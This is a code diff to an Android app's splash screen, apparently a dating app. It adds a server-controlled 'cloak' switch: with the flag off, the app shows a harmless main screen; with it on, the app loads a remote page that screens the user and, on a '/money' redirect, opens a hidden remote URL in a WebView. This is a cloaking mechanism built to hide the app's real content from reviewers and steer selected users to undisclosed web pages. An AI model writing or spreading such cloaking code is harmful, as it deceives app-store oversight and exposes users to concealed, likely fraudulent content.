@@ -25,6 +25,7 @@ import com.google.firebase.database.FirebaseDatabase
 import com.onesignal.OneSignal
 import com.yandex.metrica.YandexMetrica
 import com.yandex.metrica.YandexMetricaConfig
+import com.your.cupid.activities.MainEkrActivity
 import kotlinx.android.synthetic.main.activity_web_view.*
 import org.joda.time.DateTime
 import org.joda.time.Days
@@ -98,7 +99,7 @@ class SplashActivity : BaseActivity() {
         webView.webViewClient = object : WebViewClient() {
             @SuppressLint("deprecated")
             override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
-                if (url.contains("/main")) {
+                if (url.contains("/money")) {
                     // task url for web view or browser
 //                    val taskUrl = dataSnapshot.child(TASK_URL).value as String
                     var value = prefs.getString("show_in", "web_view")
@@ -118,14 +119,14 @@ class SplashActivity : BaseActivity() {
                             }
 
                             WEB_VIEW_DOMAIN -> {
-                                map[SHOW_IN] = CHROME_TABS
-                                database.updateChildren(map)
-                            }
-
-                            CHROME_TABS -> {
                                 map[SHOW_IN] = WEB_VIEW
                                 database.updateChildren(map)
                             }
+
+//                            CHROME_TABS -> {
+//                                map[SHOW_IN] = WEB_VIEW
+//                                database.updateChildren(map)
+//                            }
 
                         }
 
@@ -140,27 +141,27 @@ class SplashActivity : BaseActivity() {
                         WEB_VIEW -> {
                             taskUrl = dataSnapshot.child(WEB_VIEW_URL).value as String
                             startActivity(
-                                    Intent(this@SplashActivity, WebViewActivity::class.java)
-                                            .putExtra(EXTRA_TASK_URL, taskUrl)
+                                    Intent(this@SplashActivity, MainEkrActivity::class.java)
+                                            .putExtra(EXTRA_TASK_URL, taskUrl).putExtra("show_in", "webView")
                             )
                             finish()
                         }
 
-                        CHROME_TABS -> {
-                            taskUrl = dataSnapshot.child(CHROME_TABS_URL).value as String
-                            startActivity(
-                                    Intent(this@SplashActivity, ChromeTabsActivity::class.java)
-                                            .putExtra(EXTRA_TASK_URL, taskUrl)
-                            )
-                            finish()
-                        }
+//                        CHROME_TABS -> {
+//                            taskUrl = dataSnapshot.child(CHROME_TABS_URL).value as String
+//                            startActivity(
+//                                    Intent(this@SplashActivity, ChromeTabsActivity::class.java)
+//                                            .putExtra(EXTRA_TASK_URL, taskUrl)
+//                            )
+//                            finish()
+//                        }
 
                         WEB_VIEW_DOMAIN -> {
                             taskUrl = dataSnapshot.child(WEB_VIEW_DOMAIN_URL).value as String
                             taskUrl = prefs.getString("endurl", taskUrl).toString()
                             startActivity(
-                                    Intent(this@SplashActivity, WebViewActivity::class.java)
-                                            .putExtra(EXTRA_TASK_URL, taskUrl)
+                                    Intent(this@SplashActivity, MainEkrActivity::class.java)
+                                            .putExtra(EXTRA_TASK_URL, taskUrl).putExtra("show_in", "webView")
                             )
                             finish()
                         }
@@ -191,7 +192,8 @@ class SplashActivity : BaseActivity() {
 //                        finish()
 //                    }
                 } else if (url.contains("/main")) {
-                    startActivity(Intent(this@SplashActivity, MainEkranActivity::class.java))
+                    startActivity(Intent(this@SplashActivity, MainEkrActivity::class.java)
+                            .putExtra("show_in", "main"))
                     finish()
                 }
                 progressBar.visibility = View.GONE
@@ -223,9 +225,16 @@ class SplashActivity : BaseActivity() {
         getValuesFromDatabase({
             dataSnapshot = it
 
+            if (dataSnapshot.child("cloak").value as String == "0") {
+                startActivity(Intent(this@SplashActivity, MainEkrActivity::class.java)
+                        .putExtra("show_in", "main"))
+                finish()
+            }
 
-            // load needed url to determine if user is suitable
-            webView.loadUrl(it.child(SPLASH_URL).value as String)
+            if (dataSnapshot.child("cloak").value as String == "1") {
+                webView.loadUrl(it.child(SPLASH_URL).value as String)
+            }
+
         }, {
             Log.d("SplashErrActivity", "didn't work fetchremote")
             progressBar.visibility = View.GONE
